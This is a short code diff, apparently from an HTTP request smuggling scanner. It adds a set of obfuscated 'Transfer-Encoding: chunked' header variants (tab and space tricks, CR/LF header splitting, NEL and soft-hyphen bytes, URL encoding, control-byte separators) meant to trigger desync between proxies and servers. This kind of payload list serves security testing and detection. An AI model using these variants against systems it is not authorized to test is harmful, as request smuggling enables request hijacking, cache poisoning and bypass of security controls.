@@ -12,10 +12,21 @@ def render_template(gadget):
 	return p
 
 
+mutations["vanilla"] = render_template("Transfer-Encoding: chunked")
 mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
+mutations["nameprefix2"] = render_template("Foo: bar\r\n\tTransfer-Encoding: chunked")
 mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
 mutations["tabprefix2"] = render_template("Transfer-Encoding\t:\tchunked")
+mutations["nospace1"] = render_template("Transfer-Encoding:chunked")
 mutations["space1"] = render_template("Transfer-Encoding : chunked")
+mutations["connection"] = render_template("Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked")
+mutations["spjunk"] = render_template("Transfer-Encoding x: chunked")
+mutations["backslash"] = render_template("Transfer\\Encoding: chunked")
+mutations["badsetupCR"] = render_template("Foo: bar\rTransfer-Encoding: chunked")
+mutations["badsetupLF"] = render_template("Foo: bar\nTransfer-Encoding: chunked")
+mutations["nel"] = render_template("Transfer-Encoding\x85: chunked")
+mutations["shy"] = render_template("Transfer\xADEncoding: chunked")
+mutations["encode"] = render_template("Transfer-%45ncoding: chunked")
 
 for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
 	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
